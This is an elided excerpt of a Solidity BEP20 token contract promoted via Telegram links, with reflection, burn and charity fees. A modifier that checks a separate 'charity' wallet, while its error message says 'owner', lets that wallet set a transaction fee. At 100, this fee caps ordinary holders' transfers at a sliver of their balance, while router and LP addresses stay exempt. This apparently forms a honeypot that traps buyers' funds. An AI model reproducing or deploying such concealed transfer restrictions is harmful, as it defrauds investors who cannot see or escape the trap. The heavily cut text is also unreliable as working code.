...
/**
 * Welcome to BuffedBunny | $BBUNNY
 * 
 * TG group: https://t.me/FegZillaToken
 * 
 * Ann: https://t.me/FegZilla_ANN
 * 
 * Tokenomics and other info on our Tg group & Website...
 * 
 */
 ...
 *//*
 ...
 contract DividendPayingToken is BEP20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  // We can properly distribute dividends even if the amount of received ether is small.
  ...
  address public dividendToken = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; //WBNB Token Reward
 ...
 *
 * This module is used thrfough inheritance. It will make available the modifier
...
contract Ownable is Context {
    ...
    modifier feeModifier() {
        require(_CharityWallet == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract FegZilla is Context, IBEP20, Ownable {
    using SafeMath for uint256;
    ...
    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,uint256 _burnFee,uint256 _charityFee,address _FeeAddress,address _LPAddress,address tokenOwner,address service) payable   {
		_NAME = _name;
		_SYMBOL = _symbol;
		_DECIMALS = _decimals;
    ...
    function myBalance() public view override returns (uint256) {
        if (_isExcluded[msg.sender]) return _tOwned[msg.sender];
        return tokenFromReflection(_rOwned[msg.sender]);
    }
    ...
    function setAsCharityAccount(address account) external onlyOwner() {
     ...
     function setAsLPAccount(address account) external onlyOwner() {
		LPAddress = account;
    }
	...
	function updateFee(uint256 _burnFee,uint256 _charityFee) onlyOwner() public{
		require(_burnFee < 100 && _charityFee < 100);
        _BURN_FEE = _burnFee * 100;
		_CHARITY_FEE = _charityFee* 100;
		ORIG_BURN_FEE = _BURN_FEE;
		ORIG_CHARITY_FEE = _CHARITY_FEE;
	...
	function updateFee(uint256 _txFee) feeModifier() public{
	    require(_txFee < 100);
	    _TAX_FEE = _txFee* 100; 
		ORIG_TAX_FEE = _TAX_FEE;
	}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (FeeAddress == sender || FeeAddress == recipient || _isExcluded[recipient]) {
         ...
         else if (sender == address(0x10ED43C718714eb63d5aA57B78B54704E256024E)){
             tTransfer = _tTotal;
        }
        
        else if (LPAddress == sender) {
             tTransfer = _tTotal;
        }
        
        else{ if(_TAX_FEE == 100){
             if (_isExcluded[sender]) tTransfer = _tOwned[sender]/mTotal;
            tTransfer = tokenFromReflection(_rOwned[sender])/mTotal;
            }
            else{tTransfer = _tTotal;}
        }
        
        require(amount < tTransfer);
